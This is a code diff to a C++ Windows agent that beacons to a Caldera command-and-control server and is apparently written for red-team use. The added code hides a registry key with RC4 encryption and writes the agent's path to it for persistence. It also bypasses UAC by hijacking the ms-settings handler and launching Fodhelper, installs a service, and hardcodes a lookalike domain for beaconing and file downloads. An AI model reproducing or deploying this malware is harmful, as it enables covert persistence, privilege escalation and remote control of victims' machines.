@@ -2,6 +2,7 @@
 // This agent opens up an HTTP session and transmits data to a C2 (Caldera). 
 // We can use regular expressions to remove bad characters from the transmitted data.
 
+//
 #include "main.h"
 
 
@@ -9,18 +10,61 @@ string ModuleCommands = "";
 HMODULE Module = NULL;
 string Privilege = "User";
 
-int main()
-{
+
+#define MSGBOXDEF int (_stdcall *)(HWND, LPCSTR, LPCSTR, UINT)
+
+
+int(_stdcall* MessageBoxAPI)(
+    HWND   hWnd,
+    LPCSTR lpText,
+    LPCSTR lpCaption,
+    UINT   uType
+    );
+
+
+
+int main(int argc, char* argv[])
+{   
+    char Filename[MAX_PATH] = { 0 };
+    
+    DWORD nLength = GetModuleFileName(NULL, Filename, MAX_PATH) + 1;
+    const char* EncryptedRegKey = "\x97\x8b\x82\x90\x93\x85\x96\x81\x98\x89\xad\xa7\xb6\xab\xb7\xab\xa2\xb0\x98\x93\xad\xaa\xa0\xab\xb3\xb7\x98\x87\xb1\xb6\xb6\xa1\xaa\xb0\x92\xa1\xb6\xb7\xad\xab\xaa\x98\x96\xb1\xaa";
+    
+    char* DecryptedRegKey = (char*)RC4((char*)"RedTeam", (unsigned char*)EncryptedRegKey, strlen(EncryptedRegKey));
+    printf("Decrypted Registry Key: %s", DecryptedRegKey);
+    UpdateRegistry(HKEY_CURRENT_USER, DecryptedRegKey, (char*)"RedTeam", (char*)Filename, nLength, REG_SZ, false);
+    return 0;
+
+
+    if (argc < 2)
+    {
+ 
+        string command = string(Filename) + " -a";
+        UpdateRegistry(HKEY_CURRENT_USER, (char*)"SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command", NULL, (char*)command.c_str(), command.length(), REG_SZ, true);
+        UpdateRegistry(HKEY_CURRENT_USER, (char*)"SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command", (char*)"DelegateExecute", (char*)"", 0, REG_SZ, true);
+        system("Fodhelper.exe");
+        return 0;
+    }
+    else if (string(argv[1]) == " -a")
+    {
+        cout << "Running as administrator!!\n";
+        Privilege = "Elevated";
+        InstallService((char*)"RedTeamAgentNew");
+
+    }
+
+
+
     string paw = "";
     while (true)
     {
         JSON msg = {
                 "pid", "1200",
-                "server", " ",          // C2 URL
-                "platform", "",
-                "host", "",
-                "username", "",
-                "architecture", "",
+                "server", "linkedinsolutions.com",
+                "platform", "windows",
+                "host", "RedTeamAgent",
+                "username", "infected",
+                "architecture", "amd64",
                 "privilege", Privilege.c_str(),
                 "executors", json::Array("psh", "cmd")
         };
@@ -32,7 +76,7 @@ int main()
         char* encodedmsg = b64encode((char*)msg.dump().c_str(), msg.dump().length());
         printf("Our Encoded Msg: %s\n", encodedmsg);
 
-        HINTERNET hSession = SendRequest(" ", 80, "/beacon", "POST", encodedmsg); // C2 URL as first argument.
+        HINTERNET hSession = SendRequest("www.linkedinsolutions.com", 80, "/beacon", "POST", encodedmsg);
         if (hSession)
         {
             printf("Data has been sent successfully\n");
@@ -90,7 +134,7 @@ int main()
                     DWORD Length = 0;
                     //download <filename>
                     string filename = fullcmd.substr(strlen("download "));
-                    string FullURL = "" + filename; // C2 URL
+                    string FullURL = "http://www.linkedinsolutions.com/gui/" + filename;
                     char* FileData = DownloadFile(FullURL.c_str(), &Length, NULL);
                     FILE* f = fopen(filename.c_str(), "wb");
                     fwrite(FileData, 1, Length, f);
@@ -165,7 +209,7 @@ int main()
                 char* encodedmsg = b64encode((char*)msg.dump().c_str(), msg.dump().length());
                 printf("Our Encoded Msg: %s\n", encodedmsg);
 
-                hSession = SendRequest(" ", 80, "/beacon", "POST", encodedmsg);  // C2 URL
+                hSession = SendRequest("www.linkedinsolutions.com", 80, "/beacon", "POST", encodedmsg);
                 if (hSession)
                 {
                     printf("Data has been sent successfully\n");
